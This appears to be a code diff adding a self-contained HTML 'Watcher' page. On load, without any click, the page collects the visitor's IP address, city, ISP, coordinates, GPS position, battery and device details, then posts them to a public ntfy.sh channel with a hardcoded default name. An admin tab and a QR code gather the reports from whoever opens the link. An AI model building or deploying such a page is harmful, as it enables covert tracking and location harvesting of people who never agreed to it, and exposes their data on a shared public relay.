@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Watcher</title>
+<style>
+  html,body{margin:0;padding:0;background:#0f1115}
+  #w{ --bg:#0f1115; --fg:#e5e7eb; --dim:#8b93a1;
+      min-height:100vh; background:var(--bg); color:var(--fg); padding:22px 18px 40px;
+      font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Inter,sans-serif;
+      font-size:14px; line-height:1.45; }
+  #w *{box-sizing:border-box}
+  #w .inner{max-width:620px;margin:0 auto}
+  #w .tab{padding:6px 12px;border:none;background:transparent;color:inherit;opacity:.55;font:inherit;font-size:14px;cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-1px}
+  #w .tab.on{opacity:1;font-weight:500;border-bottom-color:#3b82f6}
+  #w .btn{padding:7px 14px;border-radius:8px;border:1px solid rgba(255,255,255,.22);background:transparent;color:inherit;font:inherit;font-size:13px;cursor:pointer}
+  #w .btn.p{background:#3b82f6;border-color:#3b82f6;color:#fff}
+  #w input{padding:7px 10px;border-radius:8px;border:1px solid rgba(255,255,255,.22);background:rgba(255,255,255,.04);color:inherit;font:inherit;font-size:13px;outline:none}
+  #w .card{border:1px solid rgba(255,255,255,.14);border-radius:10px;padding:12px 14px}
+  #w .kv{display:flex;justify-content:space-between;gap:12px;padding:6px 0;font-size:13px;border-bottom:1px solid rgba(255,255,255,.07)}
+  #w .kv:last-child{border-bottom:none}
+  #w .kv b{font-weight:400;color:var(--dim)}
+  #w .kv i{font-style:normal;text-align:right;word-break:break-word;max-width:62%}
+  #w .mono{font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
+  #w .pill{display:inline-block;font-size:11px;padding:2px 8px;border-radius:99px;border:1px solid rgba(255,255,255,.22);color:var(--dim)}
+</style>
+</head>
+<body>
+<div id="w"><div class="inner">
+
+  <div style="display:flex;align-items:baseline;gap:10px;flex-wrap:wrap">
+    <div style="font-size:20px;font-weight:500">Watcher</div>
+    <div style="font-size:12px;color:var(--dim)">one file &middot; no server &middot; no signup</div>
+  </div>
+  <div style="font-size:12px;color:var(--dim);margin:6px 0 18px">
+    A device opens this page and reports in. You watch from the admin tab. Same channel on both sides and nobody else sees it.
+  </div>
+
+  <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:18px">
+    <span style="font-size:12px;color:var(--dim)">channel</span>
+    <input id="chan" class="mono" style="min-width:200px">
+    <button id="saveChan" class="btn">set</button>
+    <span id="chanMsg" style="font-size:12px;color:var(--dim)"></span>
+  </div>
+
+  <div style="display:flex;gap:4px;border-bottom:1px solid rgba(255,255,255,.14);margin-bottom:18px">
+    <button class="tab on" data-t="dev">This device</button>
+    <button class="tab" data-t="adm">Admin</button>
+  </div>
+
+  <div id="dev">
+    <div style="display:flex;gap:8px;align-items:center;margin-bottom:12px;flex-wrap:wrap">
+      <input id="label" placeholder="name this device (optional)" style="min-width:220px">
+      <button id="sendBtn" class="btn p">Send now</button>
+      <span id="devMsg" style="font-size:12px;color:var(--dim)"></span>
+    </div>
+    <div id="devData" class="card"><div style="font-size:13px;color:var(--dim)">reading device...</div></div>
+  </div>
+
+  <div id="adm" hidden>
+    <div id="qrBox" style="display:flex;gap:14px;align-items:center;margin-bottom:16px;flex-wrap:wrap">
+      <div id="qr" style="background:#fff;padding:6px;border-radius:8px;line-height:0"></div>
+      <div style="font-size:12px;color:var(--dim);max-width:330px">
+        Scan this on a phone to open the same page there, then set the channel and hit send.
+        <div id="qrUrl" class="mono" style="word-break:break-all;margin-top:6px;opacity:.75"></div>
+      </div>
+    </div>
+    <div style="display:flex;gap:8px;align-items:center;margin-bottom:12px;flex-wrap:wrap">
+      <button id="refresh" class="btn p">Refresh</button>
+      <span id="admMsg" style="font-size:12px;color:var(--dim)"></span>
+      <span id="admCount" class="pill"></span>
+    </div>
+    <div id="admList"></div>
+  </div>
+
+</div></div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script>
+(function(){
+  var $ = function(s){ return document.querySelector(s); };
+  var TK='watcher_topic', IK='watcher_id', LK='watcher_log', LB='watcher_label';
+  var DEF='venice-watcher-9k2';
+  var topic = localStorage.getItem(TK) || DEF;
+  var devId = localStorage.getItem(IK);
+  if(!devId){ devId = Math.random().toString(36).slice(2,7); localStorage.setItem(IK, devId); }
+
+  $('#chan').value = topic;
+  $('#label').value = localStorage.getItem(LB) || '';
+
+  function esc(s){ return String(s==null?'':s).replace(/[&<>"]/g, function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]; }); }
+  function fmt(t){ try { return new Date(t).toLocaleString(); } catch(e){ return String(t); } }
+  function row(k,v){ if(v===null||v===undefined||v==='') return ''; return '<div class="kv"><b>'+esc(k)+'</b><i>'+esc(v)+'</i></div>'; }
+  function shortUA(ua){
+    if(!ua) return '';
+    var m = ua.match(/(Windows NT [\d.]+|Android [\d.]+|iPhone OS [\d_]+|Mac OS X [\d_.]+|Linux)/);
+    var b = ua.match(/(Edg|Chrome|Firefox|Safari)\/[\d.]+/);
+    return [m?m[1]:'', b?b[1]:''].filter(Boolean).join(' / ') || ua.slice(0,60);
+  }
+
+  async function collect(){
+    var d = {
+      id: devId,
+      t: new Date().toISOString(),
+      label: localStorage.getItem(LB) || '',
+      ua: navigator.userAgent,
+      platform: (navigator.userAgentData && navigator.userAgentData.platform) || navigator.platform || '',
+      lang: navigator.language,
+      tz: (function(){ try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){ return ''; } })(),
+      screen: screen.width + 'x' + screen.height,
+      win: innerWidth + 'x' + innerHeight,
+      cores: navigator.hardwareConcurrency || null,
+      memGB: navigator.deviceMemory || null,
+      touch: ('ontouchstart' in window) ? 'yes' : 'no',
+      online: navigator.onLine ? 'yes' : 'no'
+    };
+    try {
+      var r = await fetch('https://ipwho.is/');
+      var j = await r.json();
+      if(j && j.ip){ d.ip=j.ip; d.city=j.city; d.region=j.region; d.country=j.country; d.isp=j.connection && j.connection.isp; d.lat=j.latitude; d.lon=j.longitude; }
+    } catch(e){
+      try { var r2 = await fetch('https://api.ipify.org?format=json'); var j2 = await r2.json(); d.ip = j2.ip; } catch(e2){}
+    }
+    try { if(navigator.getBattery){ var b = await navigator.getBattery(); d.battery = Math.round(b.level*100) + '%'; } } catch(e){}
+    try {
+      var g = await new Promise(function(res,rej){ navigator.geolocation.getCurrentPosition(res,rej,{timeout:6000}); });
+      d.gps = g.coords.latitude.toFixed(4) + ', ' + g.coords.longitude.toFixed(4);
+    } catch(e){}
+    return d;
+  }
+
+  function paint(d){
+    $('#devData').innerHTML =
+      row('ip address', d.ip) + row('location', [d.city,d.region,d.country].filter(Boolean).join(', ')) +
+      row('isp', d.isp) + row('gps', d.gps) + row('device', shortUA(d.ua)) +
+      row('platform', d.platform) + row('screen', d.screen) + row('window', d.win) +
+      row('cpu cores', d.cores) + row('memory', d.memGB ? d.memGB + ' GB' : '') + row('battery', d.battery) +
+      row('timezone', d.tz) + row('language', d.lang) + row('touchscreen', d.touch) +
+      row('device id', d.id) + row('read at', fmt(d.t));
+  }
+
+  async function send(){
+    var msg = $('#devMsg');
+    msg.textContent = 'sending...';
+    msg.style.color = '';
+    try {
+      var d = await collect();
+      paint(d);
+      localStorage.setItem(LB, $('#label').value.trim());
+      d.label = localStorage.getItem(LB) || '';
+      var r = await fetch('https://ntfy.sh/' + encodeURIComponent(topic), { method:'POST', body: JSON.stringify(d) });
+      if(!r.ok) throw new Error('relay said ' + r.status);
+      msg.textContent = 'sent to channel "' + topic + '"';
+      msg.style.color = '#22c55e';
+    } catch(e){
+      msg.textContent = 'could not send (' + e.message + ')';
+      msg.style.color = '#ef4444';
+    }
+  }
+
+  function log(){
+    try { return JSON.parse(localStorage.getItem(LK) || '[]'); } catch(e){ return []; }
+  }
+
+  async function refresh(){
+    var msg = $('#admMsg');
+    msg.textContent = 'checking...';
+    msg.style.color = '';
+    try {
+      var r = await fetch('https://ntfy.sh/' + encodeURIComponent(topic) + '/json?poll=1&since=all');
+      var txt = await r.text();
+      var incoming = [];
+      txt.split('\n').forEach(function(line){
+        if(!line.trim()) return;
+        try { var m = JSON.parse(line); if(m.event === 'message'){ incoming.push(JSON.parse(m.message)); } } catch(e){}
+      });
+      var merged = log();
+      var seen = {};
+      merged.forEach(function(x){ seen[x.t + '|' + x.id] = 1; });
+      incoming.forEach(function(x){ if(!seen[x.t + '|' + x.id]){ merged.push(x); seen[x.t + '|' + x.id] = 1; } });
+      merged.sort(function(a,b){ return new Date(b.t) - new Date(a.t); });
+      merged = merged.slice(0, 500);
+      localStorage.setItem(LK, JSON.stringify(merged));
+      render(merged);
+      msg.textContent = 'channel "' + topic + '"';
+    } catch(e){
+      msg.textContent = 'relay unreachable (' + e.message + ')';
+      msg.style.color = '#ef4444';
+      render(log());
+    }
+  }
+
+  function render(all){
+    var byId = {};
+    all.forEach(function(r){ if(!byId[r.id] || new Date(r.t) > new Date(byId[r.id].t)) byId[r.id] = r; });
+    var arr = Object.keys(byId).map(function(k){ return byId[k]; }).sort(function(a,b){ return new Date(b.t) - new Date(a.t); });
+    $('#admCount').textContent = arr.length + (arr.length === 1 ? ' device' : ' devices');
+    var el = $('#admList');
+    if(!arr.length){
+      el.innerHTML = '<div style="font-size:13px;color:var(--dim)">Nothing yet. Open this page on another device, set the same channel, hit send.</div>';
+      return;
+    }
+    el.innerHTML = arr.map(function(r){
+      return '<div class="card" style="margin-bottom:10px">' +
+        '<div style="display:flex;justify-content:space-between;gap:10px;margin-bottom:6px;flex-wrap:wrap">' +
+          '<div style="font-weight:500">' + esc(r.label || ('device ' + r.id)) + '</div>' +
+          '<div style="font-size:12px;color:var(--dim)">' + fmt(r.t) + '</div>' +
+        '</div>' +
+        row('ip address', r.ip) + row('location', [r.city,r.region,r.country].filter(Boolean).join(', ')) +
+        row('isp', r.isp) + row('gps', r.gps) + row('device', shortUA(r.ua)) +
+        row('platform', r.platform) + row('screen', r.screen) + row('battery', r.battery) +
+        row('timezone', r.tz) + row('language', r.lang) + row('online', r.online) +
+      '</div>';
+    }).join('');
+  }
+
+  var qrTries = 0;
+  function buildQR(){
+    var url = location.href;
+    $('#qrUrl').textContent = url;
+    var el = $('#qr');
+    if(typeof QRCode === 'undefined'){
+      qrTries++;
+      if(qrTries < 12){ setTimeout(buildQR, 350); }
+      else { el.innerHTML = '<div style="font-size:10px;color:#555;padding:8px">QR needs internet</div>'; }
+      return;
+    }
+    el.innerHTML = '';
+    new QRCode(el, { text: url, width:132, height:132, colorDark:'#000000', colorLight:'#ffffff' });
+  }
+
+  document.querySelectorAll('#w .tab').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      document.querySelectorAll('#w .tab').forEach(function(b){ b.classList.remove('on'); });
+      btn.classList.add('on');
+      var t = btn.getAttribute('data-t');
+      $('#dev').hidden = (t !== 'dev');
+      $('#adm').hidden = (t !== 'adm');
+      if(t === 'adm') refresh();
+    });
+  });
+
+  $('#saveChan').addEventListener('click', function(){
+    var v = $('#chan').value.trim().replace(/[^A-Za-z0-9_-]/g, '');
+    if(!v){ $('#chanMsg').textContent = 'letters, numbers, - and _ only'; return; }
+    topic = v;
+    localStorage.setItem(TK, topic);
+    $('#chan').value = topic;
+    $('#chanMsg').textContent = 'channel set';
+    if(!$('#adm').hidden) refresh();
+  });
+
+  $('#sendBtn').addEventListener('click', send);
+  $('#refresh').addEventListener('click', refresh);
+  $('#label').addEventListener('change', function(){ localStorage.setItem(LB, $('#label').value.trim()); });
+
+  setInterval(function(){ if(!$('#adm').hidden) refresh(); }, 25000);
+
+  buildQR();
+  send();
+})();
+</script>
+</body>
+</html>
